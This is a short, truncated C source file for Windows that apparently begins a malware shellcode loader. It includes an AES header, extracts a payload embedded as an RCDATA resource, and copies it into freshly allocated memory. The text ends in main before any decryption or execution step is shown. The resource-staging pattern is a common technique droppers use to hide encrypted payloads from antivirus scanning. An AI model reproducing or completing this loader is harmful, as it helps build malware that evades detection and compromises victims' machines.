#include <Windows.h>
#include "aes.h"

typedef struct RsrcInfo {
	PVOID pWorkBuffer;
	SIZE_T sBufferSize;
};

RsrcInfo CloneRsrcPayload()
{
	HRSRC hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	PVOID pPayload = LockResource(hGlobal);
	SIZE_T sPayloadSize = SizeofResource(NULL, hRsrc);
	PVOID pWorkBuffer = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	RtlMoveMemory(pWorkBuffer, pPayload, sPayloadSize);
	RsrcInfo ReturnInfo = { .pWorkBuffer = pWorkBuffer, .sBufferSize = sPayloadSize };
	return ReturnInfo;
}

int main()
{
	RsrcInfo sBufferInfo = CloneRsrcPayload();
	SIZE_T sPayloadSize = sBufferInfo.sBufferSize;
	PVOID pPayload = sBufferInfo.pWorkBuffer;